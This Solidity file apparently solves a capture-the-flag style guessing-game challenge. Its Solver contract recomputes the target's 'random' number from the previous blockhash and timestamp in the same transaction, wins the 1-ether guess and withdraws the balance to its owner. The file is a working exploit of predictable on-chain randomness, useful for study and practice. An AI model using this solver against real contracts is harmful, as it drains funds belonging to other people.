// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

interface Guessable {
    function isComplete() external view returns (bool);
    function guess(uint8 n) external payable;
}

contract Dummy is Guessable {
    bool complete = false;

    address payable public owner;

    constructor() {
        owner = payable(msg.sender);
    }

    function shutdown() external {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }

    function isComplete() override external view returns (bool){
        return complete;
    }

    function guess(uint8 n) override external payable {

        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));

        owner.transfer(address(this).balance);

        if (n == answer) {
            complete = true;
        }
    }
}

contract Solver {
    address payable public owner;

    constructor() {
        owner = payable(msg.sender);
    }

    function shutdown() external {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }

    function solve(address guessableAddress) public payable{
        require(address(this).balance >= 1 ether, "contract needs to be funded first");
        Guessable guessable = Guessable(guessableAddress);
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        guessable.guess{value:1 ether}(answer);

        require(guessable.isComplete(), "completion failed");

        owner.transfer(address(this).balance);
    }

    receive() external payable {}
}